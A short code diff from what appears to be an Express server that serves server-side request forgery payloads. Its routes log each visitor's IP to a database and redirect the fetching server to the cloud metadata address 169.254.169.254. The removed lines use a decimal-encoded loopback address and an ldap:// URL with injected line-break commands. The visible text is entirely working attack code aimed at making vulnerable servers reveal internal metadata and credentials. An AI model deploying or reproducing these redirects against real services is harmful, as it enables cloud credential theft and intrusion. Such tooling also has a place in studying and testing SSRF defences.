@@ -21,13 +21,13 @@ router.get('/payload', function(req, res) {
  router.get('/redir', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect('http://2130706433/latest/meta-data') // Notice the 303 parameter
+    res.redirect(303, 'http://169.254.169.254/latest/meta-data/') // Notice the 303 parameter
  });
 
  router.get('/redir2', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect('ldap://localhost:1337/%0astats%0aquit')
+    res.redirect('http://169.254.169.254/latest/meta-data/')
  });
 
  router.get('/redir3', function(req, res) {
